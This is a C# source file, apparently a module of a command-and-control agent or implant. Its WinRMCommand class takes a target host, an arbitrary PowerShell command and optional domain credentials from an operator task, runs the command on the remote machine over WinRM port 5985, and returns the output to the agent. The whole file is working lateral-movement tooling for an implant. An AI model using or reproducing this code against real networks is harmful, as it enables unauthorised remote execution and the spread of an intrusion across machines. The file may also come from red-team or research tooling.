using System;
using System.Collections.Generic;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Agent.Models;
using Shared;

namespace Agent.Commands.Execution
{
    internal class WinRMCommand : AgentCommand
    {
        public override CommandId Command => CommandId.Winrm;
        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
        {
            task.ThrowIfParameterMissing(ParameterId.Command);
            task.ThrowIfParameterMissing(ParameterId.Target);

            string cmd = task.GetParameter<string>(ParameterId.Command);
            string target = task.GetParameter<string>(ParameterId.Target);

            //context.AppendResult($"target : {target}");
            //context.AppendResult($"cmd length : {cmd.Length}");

            var uri = new Uri($"http://{target}:5985/wsman");

            WSManConnectionInfo conn = null;

            if (task.HasParameter(ParameterId.Domain) && task.HasParameter(ParameterId.User) && task.HasParameter(ParameterId.Password))
            {
                var domain = task.GetParameter<string>(ParameterId.Domain);
                var username = task.GetParameter<string>(ParameterId.User);
                var password = task.GetParameter<string>(ParameterId.Password);
                var credential = new PSCredential($"{domain}\\{username}", password.ToSecureString());
                conn = new WSManConnectionInfo(uri, "http://schemas.microsoft.com/powershell/Microsoft.PowerShell", credential);
            }
            else
                conn = new WSManConnectionInfo(uri);

            using (var rs = RunspaceFactory.CreateRunspace(conn))
            {
                rs.Open();

                using (var posh = System.Management.Automation.PowerShell.Create())
                {
                    posh.Runspace = rs;
                    posh.AddScript(cmd);

                    var results = posh.Invoke();
                    var output = string.Join(Environment.NewLine, results.Select(o => o.ToString()).ToArray());

                    context.AppendResult(output);
                }
            }
        }
    }
}
